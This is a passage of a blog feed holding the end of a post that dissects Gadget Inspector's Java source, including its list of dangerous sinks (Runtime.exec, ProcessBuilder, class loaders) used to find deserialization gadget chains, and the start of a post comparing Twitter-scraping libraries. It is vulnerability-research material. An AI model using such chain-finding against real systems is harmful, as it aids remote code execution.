exercise one of these, it could represent anything as mundade as causing the target to make a DNS</span></span><br><span class="line"><span class="comment"> * query to full blown RCE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method            方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argIndex          参数索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap    继承信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Parameterize this as a configuration option</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>printGadgetChain</code> 方法用于输出利用链信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将利用链写入文件：（缩进）类名 方法名 方法描述符 传递污点的参数索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> writer 写入流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> chain  利用链</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printGadgetChain</span><span class="params">(Writer writer, GadgetChain chain)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    writer.write(String.format(<span class="string">&quot;%s.%s%s (%d)%n&quot;</span>,    <span class="comment">// 污点源</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getClassReference().getName(),    <span class="comment">// 类名</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getName(),    <span class="comment">// 方法名</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getDesc(),    <span class="comment">// 描述符</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).taintedArgIndex));   <span class="comment">// 污点参数索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; chain.links.size(); i++) &#123;  <span class="comment">// 利用链</span></span><br><span class="line">        writer.write(String.format(<span class="string">&quot;  %s.%s%s (%d)%n&quot;</span>,</span><br><span class="line">                chain.links.get(i).method.getClassReference().getName(),</span><br><span class="line">                chain.links.get(i).method.getName(),</span><br><span class="line">                chain.links.get(i).method.getDesc(),</span><br><span class="line">                chain.links.get(i).taintedArgIndex));</span><br><span class="line">    &#125;</span><br><span class="line">    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h1><p>测试时发现 Gadget Inspector 无法分析用 Java16 生成的 jar 包，听说 Java8 的兼容性比较好，尝试使用 Java8 打包，可以正常执行分析，之后再补充例子。</p><p>这个工具很明显无法搜索所有的利用链，为了避免路径爆炸对每个方法只访问一次，可以用最大深度限制修改；另外也有文章分析表示生成的调用关系不够全，我没有验证过；扩充的话可以从添加 source/sink 点（规则）开始，也有人扩充了对 SQL 注入（Web）的检测之类的。</p><p>当然还是先熟悉工具的运行原理，用简单的程序测试之后，再拿实际例子（比如 ysoserial）测，难顶🤯。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">字节码增强技术探索</a></li><li><a href="https://zhuanlan.zhihu.com/p/45354152">Java虚拟机—栈帧、操作数栈和局部变量表</a></li><li><a href="https://docs.oracle.com/javase/specs/index.html">Java Language and Virtual Machine Specifications</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassReader.html">Class ClassReader</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassVisitor.html">Class ClassVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/MethodVisitor.html">Class MethodVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/FieldVisitor.html">Class FieldVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/commons/JSRInlinerAdapter.html">Class JSRInlinerAdapter</a></li><li><a href="https://paper.seebug.org/1034/">Java 反序列化工具 gadgetinspector 初窥</a></li><li><a href="http://galaxylab.pingan.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E4%B9%8B-gadgetinspector/">Java反序列化漏洞辅助工具之 gadgetinspector</a></li><li><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">java反序列化利用链自动挖掘工具gadgetinspector源码浅析</a></li></ul>]]></content>
    
    
    <summary type="html">感觉自己看了好久好久... 长文警告⚠️</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬取 twitter 数据</title>
    <link href="https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/"/>
    <id>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</id>
    <published>2021-10-11T10:44:50.000Z</published>
    <updated>2021-10-15T08:10:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接到一个需求：爬包含关键字的推文。后来才告诉我转交给别人做了（摊手），那这里就分享一下如何爬取 twitter 数据。<br><em>结果我拖了两周才开始梳理</em> 😂</p><h1 id="Twitter-API"><a href="#Twitter-API" class="headerlink" title="Twitter API"></a>Twitter API</h1><p>推特提供了 Twitter API，可以用于查询推特数据，个人使用的话有以下两种：</p><ol><li>Twitter API v2</li><li>Standard v1.1</li></ol><p>当然还有高级版和企业版：</p><ol><li>Premium v1.1</li><li>Enterprise</li></ol><p>标准版仅支持搜索 7 天内的推特，其余都支持全搜索（从 2006.03 开始），官方给出了比较：<a href="https://developer.twitter.com/en/docs/twitter-api/tweets/search/migrate">Comparing Twitter API’s Search Tweets endpoints</a> 。</p><p>使用标准版需要申请开发者账户<a href="https://developer.twitter.com/en/apply/user.html">Apply for a developer account</a>，使用 v2 版本的需要申请 <a href="https://developer.twitter.com/en/products/twitter-api/academic-research">Academic Research product track</a>。我试了申请开发者账户，然后妥妥地被拒绝了，有人说需要美国账户/手机号之类的信息，因为不想拿自用的推特瞎测试，也就罢了。</p><img src="https://i.loli.net/2021/10/11/YouCXye5JHLgNDZ.png" width="85%"><p>这里的目标是搜索特定时间范围内，包含特定关键词的 tweets（即，推文），因此就算申请到了也不能满足需求，转而寻求开源解决方案。</p><h1 id="开源解决方案"><a href="#开源解决方案" class="headerlink" title="开源解决方案"></a>开源解决方案</h1><p>搜索 GitHub 上爬取 twitter 数据的开源项目，筛选出以下 9 个试用（按 star 数量排列）：</p><table><thead><tr><th>名称</th><th>star</th><th>最后一次更新</th><th>是否可用</th></tr></thead><tbody><tr><td><a href="https://github.com/twintproject/twint">twint</a></td><td>11.7k</td><td>2021.03.03</td><td>❌</td></tr><tr><td><a href="https://github.com/tweepy/tweepy">tweepy</a></td><td>8.1k</td><td>2021.10.07</td><td>✔️（需要申请 Twitter API）</td></tr><tr><td><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></td><td>3k</td><td>2021.1.10</td><td>❌</td></tr><tr><td><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></td><td>1.9k</td><td>2020.7.28</td><td>❌</td></tr><tr><td><a href="https://github.com/Altimis/Scweet">Scweet</a></td><td>215</td><td>2021.10.08</td><td>✔️</td></tr><tr><td><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></td><td>122</td><td>2020.06.04</td><td>❌</td></tr><tr><td><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></td><td>67</td><td>2020.12.16</td><td>❌</td></tr><tr><td><a href="https://github.com/markowanga/stweet">stweet</a></td><td>57</td><td>2021.02.26</td><td>✔️</td></tr><tr><td><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></td><td>6</td><td>2019.12.15</td><td>❌</td></tr></tbody></table><h2 id="twint"><a href="#twint" class="headerlink" title="twint"></a><a href="https://github.com/twintproject/twint">twint</a></h2><p>不用 Twitter API 爬取推文，支持标签、趋势、敏感信息等搜索选项，也支持爬取用户信息，包括关注者、推文。</p><ol><li><p>安装</p><p> 直接从 pypi 安装的包版本较低，需要升级</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade git+https://github.com/twintproject/twint.git@origin/master<span class="comment">#egg=twint</span></span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 配置一个代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> twint</span><br><span class="line"></span><br><span class="line">c = twint.Config()</span><br><span class="line">c.Proxy_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">c.Proxy_port = <span class="string">&#x27;7890&#x27;</span></span><br><span class="line">c.Proxy_type = <span class="string">&#x27;http&#x27;</span></span><br><span class="line"></span><br><span class="line">c.Store_csv = <span class="literal">True</span></span><br><span class="line">c.Output = <span class="string">&quot;tweets.csv&quot;</span></span><br><span class="line"></span><br><span class="line">c.Limit = <span class="number">10</span></span><br><span class="line">c.Custom_query = <span class="string">&quot;nijisanji&quot;</span></span><br><span class="line"></span><br><span class="line">twint.run.Search(c)</span><br></pre></td></tr></table></figure><p> 然后挂掉</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:root:Error retrieving https://twitter.com/: ConnectTimeout(MaxRetryError(<span class="string">&quot;HTTPSConnectionPool(host=&#x27;twitter.com&#x27;, port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x000001D2C5A295B0&gt;, &#x27;Connection to twitter.com timed out. (connect timeout=10)&#x27;))&quot;</span>)), retrying</span><br></pre></td></tr></table></figure><p> 翻了翻 issue 有人在二月份修复了：<a href="https://github.com/twintproject/twint/pull/1138">Fix the bug that proxy cannot be used when get token #1138</a>，但没有合并。</p><p> 顺便发现有人提设置时间范围的 <code>since</code> 和 <code>until</code> 失效了</p><ul><li><a href="https://github.com/twintproject/twint/issues/1281">c.Since and c.Until not getting all tweets #1281</a></li><li><a href="https://github.com/twintproject/twint/issues/1261">Since~Until doesn’t work anymore #1261</a></li></ul></li><li><p>总结</p><p> 自己试着修改或者等一个大更新，四百多的 issue 看来是没有太多的精力修啊😅</p></li></ol><h2 id="tweepy"><a href="#tweepy" class="headerlink" title="tweepy"></a><a href="https://github.com/tweepy/tweepy">tweepy</a></h2><p>实际上就是对 twitter API 的封装，不用从零手写请求和处理数据。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tweepy</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 没有申请到开发者账户，跳过！</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tweepy</span><br><span class="line"></span><br><span class="line">auth = tweepy.OAuthHandler(consumer_key, consumer_secret)</span><br><span class="line">auth.set_access_token(access_token, access_token_secret)</span><br><span class="line"></span><br><span class="line">api = tweepy.API(auth)</span><br><span class="line"></span><br><span class="line">public_tweets = api.home_timeline()</span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> public_tweets:</span><br><span class="line">    print(tweet.text)</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> Twitter API v2 的支持还在开发中，申请到开发者账户的就用它吧！</p></li></ol><h2 id="twitter-scraper"><a href="#twitter-scraper" class="headerlink" title="twitter-scraper"></a><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></h2><p>支持标签、趋势等搜索选项，也支持用户信息的搜索。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitter_scraper</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 因为没有提供设值代理的选项，所以直接在本地开全局模式代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twitter_scraper <span class="keyword">import</span> get_tweets</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> get_tweets(<span class="string">&#x27;twitter&#x27;</span>):</span><br><span class="line">    print(tweet[<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p> 报错😅</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ProxyError: HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /i/profiles/show/twitter/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;include_new_items_bar=<span class="literal">true</span> (Caused by ProxyError(<span class="string">&#x27;Cannot connect to proxy.&#x27;</span>, OSError(0, <span class="string">&#x27;Error&#x27;</span>)))</span><br></pre></td></tr></table></figure><p> 改下源码，报错在 tweets.py 这个文件，添加代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tweets</span>(<span class="params">query, pages=<span class="number">25</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_tweets</span>(<span class="params">pages</span>):</span></span><br><span class="line">        proxy = <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span></span><br><span class="line">        r = session.get(url, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p> 重新执行，新的报错😅</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> 作者说现在已经无法使用了（<a href="https://github.com/bisguzar/twitter-scraper/issues/191">Does this work? #191</a>），而且自己忙于工作暂时没时间更新（<a href="https://github.com/bisguzar/twitter-scraper/issues/189#issuecomment-832690515">Doesn’t scrap anything. #189</a>），暂且观望吧。</p></li></ol><h2 id="twitterscraper"><a href="#twitterscraper" class="headerlink" title="twitterscraper"></a><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></h2><p>所以为什么要起一样的名字？！</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitterscraper</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 直接上命令行了，但是无法访问默认代理 <a href="https://free-proxy-list.net/">https://free-proxy-list.net</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitterscraper Trump --<span class="built_in">limit</span> 1000 --output=tweets.json</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="string">&#x27;free-proxy-list.net&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x0000019FAE33BDC0&gt;: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。&#x27;</span>))</span><br></pre></td></tr></table></figure><p> 修改源码 query.py，直接返回本地代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxies</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;127.0.0.1:7890&#x27;</span>]</span><br><span class="line">    response = requests.get(PROXY_URL)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    table = soup.find(<span class="string">&#x27;table&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;proxylisttable&#x27;</span>)</span><br><span class="line">    list_tr = table.find_all(<span class="string">&#x27;tr&#x27;</span>)</span><br><span class="line">    list_td = [elem.find_all(<span class="string">&#x27;td&#x27;</span>) <span class="keyword">for</span> elem <span class="keyword">in</span> list_tr]</span><br><span class="line">    list_td = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, list_td))</span><br><span class="line">    list_ip = [elem[<span class="number">0</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_ports = [elem[<span class="number">1</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_proxies = [<span class="string">&#x27;:&#x27;</span>.join(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(list_ip, list_ports))]</span><br><span class="line">    <span class="keyword">return</span> list_proxies               </span><br></pre></td></tr></table></figure><p> 输出请求参数，然后报错…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INFO:twitterscraper:queries: [<span class="string">&#x27;Trump since:2006-03-21 until:2006-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2006-12-30 until:2007-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2007-10-10 until:2008-07-20&#x27;</span>, <span class="string">&#x27;Trump since:2008-07-20 until:2009-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2009-04-30 until:2010-02-08&#x27;</span>, <span class="string">&#x27;Trump since:2010-02-08 until:2010-11-19&#x27;</span>, <span class="string">&#x27;Trump since:2010-11-19 until:2011-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2011-08-31 until:2012-06-10&#x27;</span>, <span class="string">&#x27;Trump since:2012-06-10 until:2013-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2013-03-21 until:2013-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2013-12-30 until:2014-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2014-10-10 until:2015-07-21&#x27;</span>, <span class="string">&#x27;Trump since:2015-07-21 until:2016-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2016-04-30 until:2017-02-09&#x27;</span>, <span class="string">&#x27;Trump since:2017-02-09 until:2017-11-20&#x27;</span>, <span class="string">&#x27;Trump since:2017-11-20 until:2018-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2018-08-31 until:2019-06-11&#x27;</span>, <span class="string">&#x27;Trump since:2019-06-11 until:2020-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2020-03-21 until:2020-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2020-12-30 until:2021-10-11&#x27;</span>]</span><br><span class="line">ConnectionError HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /search?f=tweets&amp;vertical=default&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002975B91D430&gt;: Failed to establish a new connection: [WinError 